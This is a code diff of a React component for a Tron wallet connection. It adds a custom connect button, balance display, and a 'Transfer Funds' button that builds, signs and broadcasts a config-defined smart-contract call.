@@ -1,9 +1,18 @@
 import { useWallet, WalletProvider } from '@tronweb3/tronwallet-adapter-react-hooks';
-import { WalletModalProvider, WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
+import { WalletModalProvider, Button } from '@tronweb3/tronwallet-adapter-react-ui';
+// import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
 import '@tronweb3/tronwallet-adapter-react-ui/style.css';
 import { WalletDisconnectedError, WalletError, WalletNotFoundError } from '@tronweb3/tronwallet-abstract-adapter';
-import toast, { Toaster } from 'react-hot-toast';
+import toast from 'react-hot-toast';
 import { useState, useEffect } from 'react';
+import { tronWeb } from '../tronweb';
+import { Alert } from '@mui/material';
+
+import TronConnectButton from './buttons/tron-connect-button'
+
+import config from '../config';
+
+const { tronContractAddress, tronFunctionName, tronFunctionParams } = config;
 
 export default function TronAdapterConnect() {
     // here use `react-hot-toast` npm package to notify user what happened
@@ -17,24 +26,24 @@ export default function TronAdapterConnect() {
     return (
     <WalletProvider onError={onError}>
         <WalletModalProvider>
-        <ConnectComponent></ConnectComponent>
+        <h1>Tron Connect</h1>
+        <TronConnectButton></TronConnectButton>
         <Profile></Profile>
+        <SignTransaction />
         </WalletModalProvider>
     </WalletProvider>
     );
 }
-function ConnectComponent() {
-    return <WalletActionButton></WalletActionButton>;
-}
+
 function Profile() {
  const { address, connected, wallet } = useWallet();
  const [balance, setBalance] = useState(null); // State to store the balance
 
   useEffect(() => {
     async function fetchBalance() {
-      if (window.tronWeb && address) {
+      if (tronWeb && address) {
         try {
-          const balanceInSun = await window.tronWeb.trx.getBalance(address); // Fetch balance in SUN (Tron’s smallest unit)
+          const balanceInSun = await tronWeb.trx.getBalance(address); // Fetch balance in SUN (Tron’s smallest unit)
           setBalance((balanceInSun / 1e6) as any); // Convert balance to TRX
         } catch (error) {
           console.error('Error fetching balance:', error);
@@ -66,4 +75,78 @@ function Profile() {
         ) : null}
    </div>
  );
+}
+
+function SignTransaction() {
+  const { signTransaction, address, connected } = useWallet();
+  const [transactionResult, setTransactionResult] = useState(null);
+  const [alertOpen, setAlertOpen] = useState(false);
+
+  async function onSignTransaction() {
+    try {
+      // Step 1: Create the transaction
+      const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
+        tronWeb.address.toHex(tronContractAddress), // Contract address in hex format
+        tronFunctionName,
+        {
+          feeLimit: 1000000,
+          callValue: 0,  // Adjust for any TRX sent along with the transaction
+        },
+        tronFunctionParams,
+        address
+      );
+      
+      console.log("unsignedTx", unsignedTx)
+
+      if (!unsignedTx.result || !unsignedTx.result.result) {
+        throw new Error("Failed to create transaction");
+      }
+
+      // Step 2: Sign the transaction
+      const signedTx = await signTransaction(unsignedTx.transaction);
+
+      // Step 3: Broadcast the transaction
+      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      // Update the transaction result state based on the response
+      setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
+      setAlertOpen(true);
+    } catch (error) {
+      console.error('Error calling contract:', error);
+      setTransactionResult('Error' as any);
+      setAlertOpen(true);
+    }
+  }
+
+  return (
+    <div>
+      {connected ? (
+        <>
+          <Button onClick={onSignTransaction}>Transfer Funds</Button>
+          {alertOpen && (
+            <Alert
+              onClose={() => setAlertOpen(false)}
+              severity={transactionResult === 'Success' ? 'success' : 'error'}
+              sx={{ width: '100%', marginTop: 1 }}
+            >
+              {transactionResult === 'Success' ? (
+                <>
+                  Success! You can check the status of your transfer on{' '}
+                  <a
+                    target="_blank"
+                    rel="noreferrer"
+                    href={`https://tronscan.io/#/address/${address}`}
+                  >
+                    TronScan
+                  </a>
+                </>
+              ) : (
+                `Transaction ${transactionResult}`
+              )}
+            </Alert>
+          )}
+        </>
+      ) : null}
+    </div>
+  );
 }
